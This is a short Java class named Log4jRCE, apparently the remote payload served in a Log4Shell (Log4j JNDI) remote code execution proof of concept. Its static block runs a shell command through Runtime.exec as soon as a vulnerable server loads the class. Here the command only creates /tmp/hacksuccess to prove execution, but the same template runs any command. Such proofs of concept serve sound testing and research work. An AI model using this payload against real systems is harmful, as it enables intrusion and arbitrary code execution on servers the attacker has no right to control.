import java.io.BufferedReader;    
import java.io.IOException;    
import java.io.InputStream;    
import java.io.InputStreamReader;    
   
public class Log4jRCE {    
    static {
        System.out.println("I am Log4jRCE from remote!!!");
 
        try {
            String [] cmd = {"bash","-c","touch /tmp/hacksuccess"};
            java.lang.Runtime.getRuntime().exec(cmd).waitFor();
        }    
        catch (Exception e) {    
             e.printStackTrace();
        }
     }    
}